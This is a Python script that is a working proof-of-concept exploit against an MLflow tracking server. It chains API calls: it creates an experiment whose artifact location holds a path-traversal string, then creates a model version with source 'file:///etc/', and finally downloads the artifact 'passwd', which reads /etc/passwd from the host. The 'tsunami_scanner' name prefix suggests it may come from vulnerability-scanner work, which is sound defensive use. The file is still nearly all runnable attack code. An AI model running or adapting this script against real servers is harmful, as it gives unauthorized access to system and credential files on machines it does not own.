import requests
import json
import random
import string

BASE_URL = "http://127.0.0.1:5000"
NAME = "tsunami_scanner_" + ''.join(random.choices(string.ascii_letters + string.digits, k=4))

def create_experiment():
    url = f"{BASE_URL}/ajax-api/2.0/mlflow/experiments/create"
    data = {
        "name": NAME,
        "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"
    }
    response = requests.post(url, json=data, headers={"Content-Type": "application/json"})
    return response.json().get("experiment_id")

def create_run(experiment_id):
    url = f"{BASE_URL}/api/2.0/mlflow/runs/create"
    data = {"experiment_id": experiment_id}
    response = requests.post(url, json=data, headers={"Content-Type": "application/json"})
    return response.json().get("run", {}).get("info", {}).get("run_id")

def create_registered_model():
    url = f"{BASE_URL}/ajax-api/2.0/mlflow/registered-models/create"
    data = {"name": NAME}
    response = requests.post(url, json=data, headers={"Content-Type": "application/json"})
    return response.json()

def create_model_version(run_id):
    url = f"{BASE_URL}/ajax-api/2.0/mlflow/model-versions/create"
    data = {
        "name": NAME,
        "run_id": run_id,
        "source": "file:///etc/"
    }
    response = requests.post(url, json=data, headers={"Content-Type": "application/json"})
    return response.json()

def get_artifact():
    url = f"{BASE_URL}/model-versions/get-artifact?path=passwd&name={NAME}&version=1"
    response = requests.get(url, headers={"Content-Type": "application/json"})
    return response.text

if __name__ == "__main__":
    experiment_id = create_experiment()
    print("Experiment ID:", experiment_id)
    
    if experiment_id:
        run_id = create_run(experiment_id)
        print("Run ID:", run_id)
        
        if run_id:
            registered_model_response = create_registered_model()
            print("Registered Model Response:", registered_model_response)
            
            model_response = create_model_version(run_id)
            print("Model Version Response:", model_response)
            
            artifact_response = get_artifact()
            print("Artifact Response:", artifact_response)
